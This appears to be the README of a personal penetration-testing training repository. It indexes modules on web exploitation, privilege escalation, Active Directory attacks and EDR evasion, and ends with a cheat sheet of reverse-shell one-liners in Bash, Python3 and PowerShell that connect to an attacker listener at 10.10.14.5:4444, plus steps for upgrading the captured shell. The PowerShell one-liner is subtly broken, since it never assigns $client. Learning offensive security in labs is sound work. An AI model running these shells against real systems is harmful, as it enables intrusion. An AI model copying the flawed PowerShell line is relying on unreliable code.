# Offensive Security & Ethical Hacking Knowledge Base

Welcome to the comprehensive, battle-tested knowledge base, interactive practice labs, and roadmap for **Ethical Hacking, Penetration Testing, Bug Bounty Hunting, and Red Teaming**.

This repository is designed to take an aspiring cybersecurity practitioner from foundational computer science and networking to senior penetration tester and red team operator level.

---

## ⚡ Learn by Practice (Start Here!)

1. 🎮 **[Interactive Offline Practice Labs Suite](file:///E:/application_install/xampp/htdocs/notes/HACKING/PRACTICE_LABS/README.md)**:
   - Run live local targets on your computer with a single click: double-click `start_all_labs.bat` to launch **`http://127.0.0.1:8888`**
   - Practice SQL Injection, Command Injection, XSS, IDOR, LFI, and capture the flags!
2. 📅 **[30-Day Practical Training Challenge](file:///E:/application_install/xampp/htdocs/notes/HACKING/30_DAY_PRACTICE_CHALLENGE.md)**:
   - Day-by-day practical training schedule with exact tasks, commands, free labs, and flag verification.
3. 🗺️ **[Master Hacking Roadmap (2026 Edition)](file:///E:/application_install/xampp/htdocs/notes/HACKING/Master_Hacking_Roadmap.md)**:
   - The end-to-end curriculum and career benchmarks.

---

## 📂 Modular Knowledge Structure

| Module | Directory / Guide | Description |
| :--- | :--- | :--- |
| **01** | [Foundations & Networking](file:///E:/application_install/xampp/htdocs/notes/HACKING/01_Foundations_and_Networking/Networking_Protocols_and_Packet_Analysis.md) | TCP/IP, OSI model, packet flow, DNS, TLS, Wireshark, Linux/Windows internals |
| **02** | [Reconnaissance & OSINT](file:///E:/application_install/xampp/htdocs/notes/HACKING/02_Reconnaissance_and_OSINT/OSINT_and_Attack_Surface_Discovery.md) | Subdomain discovery, passive OSINT, Nmap port scanning, VHost and directory fuzzing |
| **03** | [Web Application Pentesting](file:///E:/application_install/xampp/htdocs/notes/HACKING/03_Web_Application_Penetration_Testing/OWASP_Top_10_Exploitation_Guide.md) | SQLi, XSS, SSRF, SSTI, IDOR, JWT exploitation, Burp Suite mastery, GraphQL/REST |
| **04** | [Network & System Exploitation](file:///E:/application_install/xampp/htdocs/notes/HACKING/04_Network_and_System_Exploitation/Tunneling_and_Network_Pivoting_Playbook.md) | SMB, SSH, SNMP, Metasploit, Port forwarding, SOCKS proxies, Chisel & Ligolo-ng pivoting |
| **05** | [Privilege Escalation](file:///E:/application_install/xampp/htdocs/notes/HACKING/05_Privilege_Escalation/Linux_and_Windows_Privilege_Escalation.md) | Linux (SUID, Sudo, Cron, Caps) & Windows (Tokens, Potatoes, Services, Unquoted paths, LSASS) |
| **06** | [Active Directory Attacks](file:///E:/application_install/xampp/htdocs/notes/HACKING/06_Active_Directory_Attacks/Active_Directory_Exploitation_Playbook.md) | BloodHound, Kerberoasting, AS-REP Roasting, DCSync, Pass-the-Hash, Golden Tickets, ADCS |
| **07** | [Cloud & API Hacking](file:///E:/application_install/xampp/htdocs/notes/HACKING/07_Cloud_and_API_Hacking/Cloud_and_API_Penetration_Testing.md) | AWS IAM privilege escalation, S3 buckets, IMDSv1/v2, Azure Entra ID, GraphQL, REST |
| **08** | [Binary Exploitation & RE](file:///E:/application_install/xampp/htdocs/notes/HACKING/08_Binary_Exploitation_and_Reverse_Engineering/Binary_Exploitation_and_Reverse_Engineering.md) | x86/x64 Assembly, GDB/GEF, Ghidra, Buffer Overflows, ROP chains, ASLR/DEP/Canary bypasses |
| **09** | [Red Teaming & EDR Evasion](file:///E:/application_install/xampp/htdocs/notes/HACKING/09_Red_Teaming_and_AV_EDR_Evasion/Red_Teaming_and_AV_EDR_Evasion.md) | AMSI bypass, API unhooking, Direct Syscalls (SysWhispers), Process Hollowing, C2 frameworks |
| **10** | [Labs, Certifications & CheatSheet](file:///E:/application_install/xampp/htdocs/notes/HACKING/10_Labs_Certifications_and_CheatSheets/Pentest_Checklist_and_Command_CheatSheet.md) | Essential command cheat sheet, TryHackMe/HTB pathways, OSCP/CPTS/CRTP cert guide |

---

## ⚡ Quick Reference Commands

### Reverse Shells One-Liners
```bash
# Bash TCP
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Full TTY Shell Stabilization
```bash
# In target reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z

# In local attacker terminal:
stty raw -echo; fg
reset
export TERM=xterm-256color
export SHELL=bash
stty rows 38 columns 116
```
